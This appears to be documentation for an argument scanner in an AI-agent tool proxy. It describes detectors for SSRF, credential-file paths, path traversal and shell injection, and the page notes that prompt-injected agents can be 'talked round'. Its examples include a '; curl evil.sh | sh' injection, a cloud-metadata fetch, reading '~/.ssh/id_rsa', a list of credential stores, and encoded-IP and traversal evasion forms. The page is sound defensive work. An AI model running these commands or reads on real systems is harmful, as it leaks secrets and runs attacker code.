# Argument scanning

A policy rule checks what its author thought of. Some attack shapes are common
enough to check for every call, whether or not anyone wrote a rule for them:

- a fetch of `http://169.254.169.254/`, the cloud metadata address that hands
  out credentials to anything that asks;
- a read of `~/.ssh/id_rsa` or `~/.aws/credentials`;
- a path that climbs out of its directory with `../`;
- `; curl evil.sh | sh` appended to a command.

These are what an injected instruction usually asks for, so they are worth
noticing even when the model has been talked round. The proxy looks for them in
every tool call's arguments.

```yaml
scanners:
  arguments:
    action: audit            # audit (default) | approve | block | off
    detectors: [ssrf, sensitive-path, path-traversal, shell-metachar]   # default: all
    overrides:
      - tool: "fs__*"
        detectors: [sensitive-path, path-traversal]
        action: block
      - tool: "dev__curl"
        action: off
```

**On by default, in `audit` mode.** With no policy file, every call is scanned
and hits are written to the [audit log](audit-log.md) as `argument_hits`, and
nothing is refused. The detectors are heuristics: a `..` path is often
legitimate, and a URL to `localhost` is how a developer tests a local service.
Read the log for a while to see what `block` would refuse, then switch it on
where it fits.

| `action:` | What happens to a call with a hit |
| --- | --- |
| `audit` | Forwarded unchanged; `argument_hits` and `argument_hits_action: "audited"` in the log |
| `approve` | Put to a human, and the question says what was found |
| `block` | Refused; `rule` is `arguments.<detector>` |
| `off` | Not scanned |

`approve` turns an allowed call into a `require_approval` under the rule
`arguments.<detector>`, and the human reads:

```text
Allow the agent to call 'fs__get_file_info'? Guardrails rule 'arguments.path-traversal'
requires your approval. Guardrails flagged its arguments: they contain a path that climbs
out of its directory with '..' (path-traversal in 'path'). Check the arguments before
approving.
```

The question names the detector and the argument, never the value. The
approver sees the value in the call's arguments, with secrets redacted. When
the policy already sends the call to a human, its own rule, prompt, approver and
timeout are kept and the note is added to the question. An escalated call uses
the default approval settings: asked in-band, refused if nobody answers within
the default timeout. Over stateless HTTP, where nobody can be asked in-band, an
escalated call is refused.

## Where it runs

After the policy, the metadata and pin gates and the secret scanner, before
approval and budget:

- **Before approval**, so `approve` can turn an allowed call into a question,
  and a call that `block` refuses never reaches a human.
- **After the policy**, so a call the policy already denied is not refused
  twice. Its hits are still logged, without `argument_hits_action`.
- **An explicit `allow` does not silence the detectors.** A broad allow rule
  written for convenience should not also switch off a security finding nobody
  was thinking about when they wrote it. To exempt a tool, add an override.

## Overrides

Entries under `overrides` are matched against the client-visible tool name as
globs, like a rule's `tool:`. **The first matching entry wins.** An entry
inherits whatever it does not set: `{tool: "web__*", action: block}` blocks on
every detector the section enables, and `{tool: "notes__*", detectors: [ssrf]}`
keeps the section's action. `action: off` exempts a tool entirely.

Unknown keys, unknown detector names and an entry that sets neither `action`
nor `detectors` are load-time errors. A misspelt `acton: block` read as the
default `audit` would leave you believing something is blocked when it isn't.

## The detectors

| Detector | Fires on |
| --- | --- |
| `ssrf` | A URL whose host is loopback (`127.0.0.0/8`, `::1`), unspecified (`0.0.0.0/8`, `::`), private (RFC 1918, IPv6 ULA), link-local (`169.254.0.0/16`, incl. the metadata address; `fe80::/10`), carrier-grade NAT (`100.64.0.0/10`), `localhost`, `*.localhost` or `*.internal`. Schemes `http`, `https`, `ws`, `wss`, `ftp`. `file:`, `gopher:` and `dict:` URLs fire whatever the host. |
| `sensitive-path` | `.ssh/`, `id_rsa` / `id_ed25519` / other private key files (not `.pub`), `.aws/credentials`, `.config/gcloud`, `.kube/config`, `.docker/config.json`, `.npmrc`, `.pypirc`, `.netrc`, `.pgpass`, `.git-credentials`, `.env` and `.env.*` (not `.example` / `.sample` / `.template`), `/etc/shadow`, `/etc/sudoers`, `Library/Keychains`, `AppData\…\Microsoft\Credentials`, browser login and cookie stores. |
| `path-traversal` | A `..` segment next to a `/` or `\`. |
| `shell-metachar` | `;` `\|` `&` `` ` `` `>` `<`, a newline, `$(` or `${`, in an argument whose name says it is a command (`command`, `cmd`, `script`, `shell`, `exec`, `args`, `argv`, and compounds like `shell_command` or `commandLine`), or in any argument of a tool whose name contains `exec`, `shell` or `run_command`. |
| `argument-too-large` | The arguments were too large or too deeply nested to read in full: over 16 Mi characters in total, over a million values, or nested deeper than 64. Not configurable. Hitting a cap is a finding rather than a skipped check, so padding is not a way to hide a payload after the limit. |

Built to catch the forms attackers use to get past a naive check:

- **Encoded IPs.** Hosts are parsed the way `inet_aton` and most HTTP clients
  parse them, so `2130706433`, `0x7f.1`, `0177.0.0.1` and `127.1` are all
  127.0.0.1. IPv4 inside IPv6 (`::ffff:127.0.0.1`, `::10.0.0.1`, NAT64, 6to4)
  is unwrapped and checked. A trailing dot (`localhost.`), percent-encoding
  and full-width dots (`127。0。0。1`) are normalised. Userinfo is skipped
  (`http://example.com@127.0.0.1/` goes to 127.0.0.1).
- **Lenient URL syntax.** Backslashes and any number of slashes after the
  scheme, and URLs inside longer strings (`url=http://localhost`).
- **Encoded traversal.** `%2e%2e%2f`, double-encoded `%252e`, overlong UTF-8
  (`%c0%ae`, `%c0%af`), IIS `%u002e`, and Unicode look-alike dots and slashes.
- **Case and separators.** Paths match case-insensitively on every platform
  (macOS and Windows file systems are case-insensitive by default), with `/`
  and `\` treated alike.

And to stay quiet on ordinary work:

- **Prose is not a path.** A value with spaces is split into words and only
  words containing a separator are checked, so "remember to add .env to
  .gitignore" does not fire while `cat ~/.ssh/id_rsa` does. An argument whose
  name says it holds a path (`path`, `file`, `destination`, `sourcePaths`...) is
  read as one path, spaces included.
- **`shell-metachar` is scoped by name**, so `Tom & Jerry` in an issue body is
  not a shell command.
- **`..` must touch a separator.** `wait..`, `v1..v2` and a lone `..` do not fire.

Every detector is a hand-written scanner, linear in the length of the
arguments with no regex, so a crafted 10 MB argument cannot stall the proxy.
Nested objects and arrays are searched, and a hit is reported with where it was
found, e.g. `ssrf in 'request.targets[1]'`. Each detector reports its first hit
only.

## Testing it

[`policy test`](policy.md#testing-a-policy) applies the policy's
`scanners.arguments` after the rules, so `block` and `approve` show up in
`expect:` and `rule:`. Under `audit`, which never changes the verdict, assert
the hits directly:

```yaml
cases:
  - call: web__fetch
    args: { url: "http://169.254.169.254/" }
    expect: allow
    argument_hits: [ssrf]      # any order; [] asserts that nothing fires
```

## What it does not do

- **No DNS resolution.** The literal argument is judged. A public name that
  resolves to a private address, and DNS rebinding, get past `ssrf`.
- **It classifies; it does not contain.** Whether a path actually escapes its
  sandbox is the server's question. Keep containment there.
- **Values only.** Object keys are counted towards the size cap but not
  scanned.

The full list is in the [threat model](threat-model.md#argument-detectors-classify-they-do-not-contain).
